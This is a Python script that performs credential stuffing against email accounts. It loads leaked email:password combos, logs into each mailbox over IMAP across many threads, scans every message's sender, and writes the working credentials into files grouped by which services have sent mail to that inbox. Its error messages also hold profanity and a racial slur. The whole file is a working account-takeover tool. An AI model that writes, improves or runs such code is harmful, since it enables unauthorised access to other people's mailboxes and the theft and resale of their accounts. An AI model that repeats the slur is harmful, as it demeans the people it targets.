import imaplib
import json
import threading
from email import message_from_bytes
from email.header import decode_header
import os
from concurrent.futures import ThreadPoolExecutor
import time
from raducord import Logger

RESULTS_DIR = 'results'
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

try:
    with open('config.json') as f:
        config = json.load(f)
except FileNotFoundError:
    exit(1)
except json.JSONDecodeError as e:
    Logger.failed(f"Error parsing config.json,{e},json")
    exit(1)

email_accounts = config.get('email_accounts', {})
num_threads = config.get('threads', 10)

if not email_accounts:
    Logger.failed("Error,No email accounts specified in config.json.")
    exit(1)

try:
    with open('prov.txt') as f:
        providers = [line.strip().split(':') for line in f.readlines()]
except FileNotFoundError:
    exit(1)

if not providers:
    exit(1)

try:
    with open('combo.txt') as f:
        lines = f.readlines()
except FileNotFoundError:
    exit(1)

combos = []
for line in lines:
    try:
        email, password = line.strip().split(':', 1)
        combos.append((email, password))
    except ValueError:
        Logger.failed(f"Invalid combo format, {line.strip()}, skipped")

if not combos:
    print("put ur fucking combos nigga")
    exit(1)

provider_details = {}
for provider_info in providers:
    if len(provider_info) == 3:
        domain, imap_server, port = provider_info
        provider_details[domain] = (imap_server, int(port))
    else:
        print("invalid fucking provider kid")
        exit(1)

counters = {key: 0 for key in email_accounts.keys()}
counters['checked'] = 0
counters['errors'] = 0
errors = []
lock = threading.Lock()

def scan_email(imap_server, port, email, password):
    try:
        with imaplib.IMAP4_SSL(imap_server, port) as mail:
            mail.login(email, password)
            mail.select('inbox')
            result, data = mail.search(None, 'ALL')
            if result != 'OK':
                with lock:
                    counters['errors'] += 1
                    errors.append(f"Failed to retrieve emails for {email} on {imap_server}.")
                return
            
            email_ids = data[0].split()
            
            for email_id in email_ids:
                result, msg_data = mail.fetch(email_id, '(RFC822)')
                if result == 'OK':
                    msg = message_from_bytes(msg_data[0][1])
                    from_header = decode_header(msg['From'])[0][0]
                    if isinstance(from_header, bytes):
                        from_header = from_header.decode('utf-8', errors='ignore')
                    
                    with lock:
                        for key, addresses in email_accounts.items():
                            if any(address in from_header for address in addresses):
                                counters[key] += 1
                                with open(os.path.join(RESULTS_DIR, f"{key}.txt"), 'a') as file:
                                    file.write(f"{email}:{password}\n")
                                Logger.success(f"Saved combo {email}:{password},{key}.txt,saved")
            
            with lock:
                counters['checked'] += 1
                Logger.info(f"Checked,{email},{imap_server}")
    except Exception as e:
        with lock:
            counters['errors'] += 1
            errors.append(f"Error scanning {email} on {imap_server}: {e}")

def remove_duplicates():
    while True:
        time.sleep(60)
        with lock:
            for filename in os.listdir(RESULTS_DIR):
                filepath = os.path.join(RESULTS_DIR, filename)
                if os.path.isfile(filepath):
                    with open(filepath, 'r') as file:
                        lines = file.readlines()
                    unique_lines = list(set(lines))
                    with open(filepath, 'w') as file:
                        file.writelines(unique_lines)
                    Logger.info(f"Removed duplicates,{filename},duplicates removed")

def main():
    duplicate_removal_thread = threading.Thread(target=remove_duplicates, daemon=True)
    duplicate_removal_thread.start()

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for combo in combos:
            email, password = combo
            email_domain = email.split('@')[-1]
            if email_domain in provider_details:
                imap_server, port = provider_details[email_domain]
                executor.submit(scan_email, imap_server, port, email, password)
            else:
                with lock:
                    counters['errors'] += 1
                    errors.append(f"No provider found for domain {email_domain}")
                    Logger.failed(f"Provider not found,{email_domain},Failed")

    while any(t._state == 'RUNNING' for t in executor._threads):
        time.sleep(1)

    Logger.info("Scanning complete,Results saved in 'results/' directory,complete")

if __name__ == "__main__":
    main()
